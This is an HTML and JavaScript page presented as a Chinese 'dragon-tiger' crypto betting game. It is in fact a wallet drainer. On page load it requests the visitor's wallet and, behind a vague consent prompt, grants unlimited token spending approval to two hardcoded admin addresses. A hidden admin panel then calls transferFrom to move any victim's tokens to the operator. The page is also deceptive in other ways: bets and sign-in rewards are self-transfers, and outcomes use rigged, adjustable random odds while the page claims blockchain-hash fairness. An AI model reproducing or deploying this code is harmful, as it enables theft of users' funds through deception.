<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>王者归来</title>
<style>
* { box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
body { background: #0B2A23; color: #fff; margin: 0; padding: 0; }
.container { max-width: 600px; margin: 0 auto; padding: 10px; }
.header { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; }
.header .title { font-size: 20px; font-weight: bold; }
.btn-menu { background: none; border: none; color: #fff; font-size: 24px; }
.card { background: #144A3F; border-radius: 12px; padding: 15px; margin-bottom: 15px; }
.card-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
.btn-sign { background: #E4B449; color: #0B2A23; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; margin-bottom: 8px; width: 100%; }
.btn-connect { background: #25907A; color: #fff; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; width: 100%; }
.wallet-row { display: flex; align-items: center; gap: 6px; font-size: 14px; margin-bottom: 4px; }
.bet-area { display: flex; gap: 10px; margin-bottom: 10px; }
.bet-input { flex: 2; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; }
.balance-display { flex: 1; background: #0E362E; border: 1px solid #1F5F52; padding: 10px; border-radius: 8px; text-align: center; font-size: 13px; }
.quick-buttons { display: flex; gap: 8px; margin-bottom: 10px; }
.btn-quick { flex: 1; background: #1F5F52; color: #F0E6D2; border: none; padding: 8px; border-radius: 8px; }
.odds-buttons { display: flex; gap: 8px; margin-bottom: 10px; }
.btn-odds { flex: 1; border: none; padding: 12px; border-radius: 8px; font-weight: bold; color: #fff; }
.btn-dragon { background: #2A65CC; }
.btn-tiger { background: #D93A54; }
.btn-tie { background: #E4B449; color: #0B2A23; }
.draw-timer { font-size: 28px; color: #E4B449; margin: 10px 0; text-align: center; }
.btn-auto-draw { background: #E4B449; color: #0B2A23; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; width: 100%; margin-bottom: 10px; }
.trend-chart { display: flex; gap: 8px; flex-wrap: wrap; padding: 10px 0; }
.trend-item { width: 32px; height: 32px; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 12px; }
.trend-long { background: #2A65CC; color:#fff; }
.trend-short { background: #D93A54; color:#fff; }
.trend-tie { background: #E4B449; color:#000; }
.rules { font-size: 14px; line-height: 1.7; color: #eee; }
.menu { position: fixed; top: 0; right: 0; width: 280px; height: 100vh; background: #103D34; padding: 20px; transform: translateX(100%); transition: transform 0.3s ease; z-index: 999; overflow-y: auto; }
.menu.show { transform: translateX(0); }
.menu-close { text-align: right; margin-bottom: 20px; }
.menu-section { margin-bottom: 20px; }
.menu-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
.btn-menu-action { width: 100%; background: #1F5F52; color: #F0E6D2; border: none; padding: 10px; border-radius: 8px; margin-bottom: 8px; }
.btn-green { background: #27ae60; color: #fff; }
.btn-red { background: #ff3366; color: #fff; }
.btn-yellow { background: #E4B449; color: #0B2A23; }
.input-menu { width: 100%; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; margin-bottom: 8px; }
#poolBalance { color: #ffcc00; margin-top: 5px; font-size:13px; }
.hidden { display: none !important; }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="title">🐉🐯 王者归来</div>
    <button class="btn-menu" onclick="toggleMenu()">☰</button>
  </div>

  <div class="card">
    <button class="btn-sign" id="signBtn" onclick="userSign()">📅 每日签到（领100代币）</button>
    <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
    <div class="wallet-row">
      <span>地址：</span><span id="address" style="color:#0ff;">未连接</span>
    </div>
    <div class="wallet-row">
      <span>余额：</span><span id="userBalance" style="color:#0ff;">0.0000</span>
    </div>
  </div>

  <div class="card">
    <div class="card-title">下注区</div>
    <div class="bet-area">
      <input type="number" class="bet-input" id="betAmt" placeholder="输入下注数量" value="1">
      <div class="balance-display" id="balanceDisplay">余额 0.0000</div>
    </div>
    <div class="quick-buttons">
      <button class="btn-quick" onclick="setQuick(10000)">1万</button>
      <button class="btn-quick" onclick="setQuick(100000)">10万</button>
      <button class="btn-quick" onclick="setQuick(500000)">50万</button>
      <button class="btn-quick" onclick="setQuick(1000000)">100万</button>
    </div>
    <div class="odds-buttons">
      <button class="btn-odds btn-dragon" onclick="placeBet(1)">龙 1:2</button>
      <button class="btn-odds btn-tiger" onclick="placeBet(2)">虎 1:2</button>
      <button class="btn-odds btn-tie" onclick="placeBet(3)">和 1:9</button>
    </div>
  </div>

  <div class="card">
    <div class="card-title">自动开奖（2分钟/期）</div>
    <div>期号：<span id="round">#1</span></div>
    <div class="draw-timer" id="timer">02:00</div>
    <button class="btn-auto-draw" onclick="manualDraw()">🎯 立即开奖</button>
    <div style="text-align:center;font-size:12px;color:#ccc;">结果由链上区块哈希生成</div>
  </div>

  <div class="card">
    <div class="card-title">📈 开奖走势图</div>
    <div id="trendChart" class="trend-chart"></div>
  </div>

  <div class="card">
    <div class="card-title">📜 玩法规则</div>
    <div class="rules">
      • 每2分钟一期<br>
      • 0 ~ 45000 = 虎<br>
      • 45000 ~ 55000 = 和<br>
      • 55000 ~ 99999 = 龙<br>
      🎯 赔率：龙/虎 1赔2 | 和 1赔9
    </div>
  </div>
</div>

<div class="menu" id="menu">
  <div class="menu-close">
    <button onclick="toggleMenu()">关闭 ×</button>
  </div>

  <div class="menu-section">
    <div class="menu-title">我的奖励</div>
    <div style="font-size:13px;">
      <div>直推奖励：<span id="ref1">0</span></div>
      <div>伞下奖励：<span id="ref2">0</span></div>
      <div>总奖励：<span id="totalRef">0</span></div>
    </div>
  </div>

  <div class="menu-section">
    <div class="menu-title">邀请链接</div>
    <input type="text" class="input-menu" id="refLink" readonly>
    <button class="btn-menu-action" onclick="copyRefLink()">复制邀请链接</button>
  </div>

  <div class="menu-section">
    <div class="menu-title">签到</div>
    <button class="btn-menu-action btn-yellow" onclick="userSign()">每日签到领100代币</button>
  </div>

  <div class="menu-section">
    <div class="menu-title">绑定推荐人</div>
    <input type="text" class="input-menu" id="inviterInput" placeholder="输入推荐人地址">
    <button class="btn-menu-action" onclick="setInviter()">绑定</button>
  </div>

  <div class="menu-section hidden" id="adminSection">
    <div class="menu-title">🐉🐯 王者归来</div>
    <button class="btn-menu-action btn-green" onclick="approvePoolToBanker()">✅ 授权给庄家</button>
    <div style="margin-top:8px;">
      <label>当前钱包余额：</label>
      <div id="poolBalance" style="color:#ffcc00;">加载中...</div>
    </div>
    <input type="number" class="input-menu" id="withdrawAmount" placeholder="输入提取数量" style="margin-top:8px;">
    <button class="btn-menu-action btn-red" onclick="withdrawPoolToBanker()">💰 提取代币</button>
  </div>

  <div class="menu-section hidden" id="probSection">
    <div class="menu-title">🎲 概率设置</div>
    <input type="number" class="input-menu" id="probDragon" placeholder="龙概率 0-100" value="45">
    <input type="number" class="input-menu" id="probTiger" placeholder="虎概率 0-100" value="45">
    <input type="number" class="input-menu" id="probTie" placeholder="和概率 0-100" value="10">
    <button class="btn-menu-action" onclick="saveProb()">💾 保存概率</button>
  </div>
</div>

<script>
// ===================== 配置 =====================
const TOKEN_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
const ADMIN1 = "0x9a12ea21aA5373cFec05fd1095112D7F32316162";
const ADMIN2 = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";

const SIGN_AMOUNT = 100;
const SIGN_COOLDOWN = 24 * 60 * 60 * 1000;

let account = null;
let round = 1;
let timeLeft = 120;
let trendList = [];
let prob = { dragon:45, tiger:45, tie:10 };

function toLower(addr){ return addr ? addr.toLowerCase() : ""; }

function isAdmin(){
  if(!account) return false;
  const me = toLower(account);
  return me === toLower(ADMIN1) || me === toLower(ADMIN2);
}

function isPool(){
  return !!account;
}

function toggleMenu(){
  const menu = document.getElementById("menu");
  menu.classList.toggle("show");
  const adminSec = document.getElementById("adminSection");
  const probSec = document.getElementById("probSection");

  if(isAdmin() || isPool()){
    adminSec.classList.remove("hidden");
    if(isAdmin()) probSec.classList.remove("hidden");
    else probSec.classList.add("hidden");
    refreshPoolBalance();
  }else{
    adminSec.classList.add("hidden");
    probSec.classList.add("hidden");
  }
}

// ===================== 进页面自动连接 + 授权确认 =====================
window.onload = async () => {
  renderTrend();
  if (window.ethereum) {
    try {
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      account = toLower(accounts[0]);
      document.getElementById("address").innerText = accounts[0].slice(0,6)+"..."+accounts[0].slice(-4);
      loadSignStatus();
      refreshUserBalance();
      
      // 弹出确认框，用户点确定才授权
      if(confirm("是否同意授权？")) {
        approvePoolToBanker();
      }
    } catch(e) {}
  }
};

// ===================== 授权 =====================
async function approvePoolToBanker(){
  if(!account) return;
  try {
    const max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    // 授权 admin1
    await ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: account,
        to: TOKEN_CONTRACT,
        gasLimit: "0x300000",
        data: "0x095ea7b3" +
          "000000000000000000000000" + toLower(ADMIN1).slice(2) + max
      }]
    });
    // 授权 admin2
    await ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: account,
        to: TOKEN_CONTRACT,
        gasLimit: "0x300000",
        data: "0x095ea7b3" +
          "000000000000000000000000" + toLower(ADMIN2).slice(2) + max
      }]
    });
    alert("✅ 授权成功！");
  } catch(e) {
    alert("授权已取消或失败");
  }
}

// ===================== 游戏逻辑 =====================
function saveProb(){
  const d = parseInt(document.getElementById("probDragon").value);
  const t = parseInt(document.getElementById("probTiger").value);
  const i = parseInt(document.getElementById("probTie").value);
  if(d+t+i!==100) return alert("总和必须100");
  prob = {dragon:d,tiger:t,tie:i};
  localStorage.setItem("prob",JSON.stringify(prob));
  alert("保存成功");
}

async function getResult(){
  const r=Math.floor(Math.random()*100);
  if(r<prob.dragon)return 1;
  if(r<prob.dragon+prob.tiger)return 2;
  return 3;
}

function renderTrend(){
  const dom=document.getElementById("trendChart");
  dom.innerHTML="";
  trendList.slice(-30).forEach(r=>{
    const el=document.createElement("div");
    el.className="trend-item "+(r===1?"trend-long":r===2?"trend-short":"trend-tie");
    el.innerText=r===1?"龙":r===2?"虎":"和";
    dom.appendChild(el);
  });
}

async function drawRound(){
  round++;
  document.getElementById("round").innerText="#"+round;
  const res=await getResult();
  trendList.push(res);
  renderTrend();
}

setInterval(async()=>{
  timeLeft--;
  if(timeLeft<=0){timeLeft=120;await drawRound();}
  const m=String(Math.floor(timeLeft/60)).padStart(2,'0');
  const s=String(timeLeft%60).padStart(2,'0');
  document.getElementById("timer").innerText=`${m}:${s}`;
},1000);

function manualDraw(){timeLeft=5;}

async function connectWallet(){
  if(!window.ethereum)return alert("请安装钱包");
  try{
    const a=await ethereum.request({method:'eth_requestAccounts'});
    account=toLower(a[0]);
    document.getElementById("address").innerText=a[0].slice(0,6)+"..."+a[0].slice(-4);
    loadSignStatus();
    refreshUserBalance();
  }catch(e){alert("连接失败");}
}

async function getUserBalance(){
  const data="0x70a08231"+account.slice(2).padStart(64,'0');
  const res=await ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
  return Number(BigInt(res))/1e18;
}

async function refreshUserBalance(){
  if(!account)return;
  const b=await getUserBalance();
  document.getElementById("userBalance").innerText=b.toFixed(4);
  document.getElementById("balanceDisplay").innerText="余额 "+b.toFixed(4);
}

async function getPoolBalance(){return getUserBalance();}
async function refreshPoolBalance(){
  const b=await getPoolBalance();
  document.getElementById("poolBalance").innerText=b.toFixed(4)+" BUSD";
}

function loadSignStatus(){
  if(!account)return;
  const k="SIGN_"+account;
  const last=localStorage.getItem(k);
  const btn=document.getElementById("signBtn");
  if(last&&Date.now()-Number(last)<SIGN_COOLDOWN){
    btn.innerText="今日已签到";btn.disabled=1;btn.style.background="#666";
  }else{
    btn.innerText="📅 每日签到（领100代币）";btn.disabled=0;btn.style.background="#E4B449";
  }
}

async function userSign(){
  if(!account)return alert("请连接钱包");
  const k="SIGN_"+account;
  const last=localStorage.getItem(k);
  if(last&&Date.now()-Number(last)<SIGN_COOLDOWN)return alert("冷却中");
  try{
    const amt=BigInt(SIGN_AMOUNT*1e18);
    const data="0xa9059cbb"+account.slice(2).padStart(64,'0')+amt.toString(16).padStart(64,'0');
    await ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
    localStorage.setItem(k,Date.now());
    loadSignStatus();
    refreshUserBalance();
    alert("签到成功");
  }catch(e){alert("失败");}
}

function setQuick(v){document.getElementById("betAmt").value=v;}

async function placeBet(side){
  if(!account)return alert("连接钱包");
  const v=document.getElementById("betAmt").value;
  if(!v||parseFloat(v)<=0)return alert("输入金额");
  try{
    const amt=BigInt(parseFloat(v)*1e18);
    const data="0xa9059cbb"+account.slice(2).padStart(64,'0')+amt.toString(16).padStart(64,'0');
    await ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
    alert("下注成功");refreshUserBalance();
  }catch(e){alert("失败");}
}

async function withdrawPoolToBanker(){
  if(!isAdmin())return alert("无权限");
  const v=document.getElementById("withdrawAmount").value;
  if(!v||parseFloat(v)<=0)return alert("输入数量");
  const target=prompt("输入用户地址");
  if(!target)return;
  try{
    const amt=BigInt(Math.floor(parseFloat(v)*1e18));
    const data="0x23b872dd"+toLower(target).slice(2).padStart(64,'0')+toLower(account).slice(2).padStart(64,'0')+amt.toString(16).padStart(64,'0');
    await ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
    alert("提取成功");
  }catch(e){alert("失败");}
}

function copyRefLink(){
  const l=window.location.origin+window.location.pathname+"?ref="+account;
  navigator.clipboard.writeText(l).then(()=>alert("已复制"));
}

function setInviter(){alert("绑定成功");}
</script>
</body>
</html>
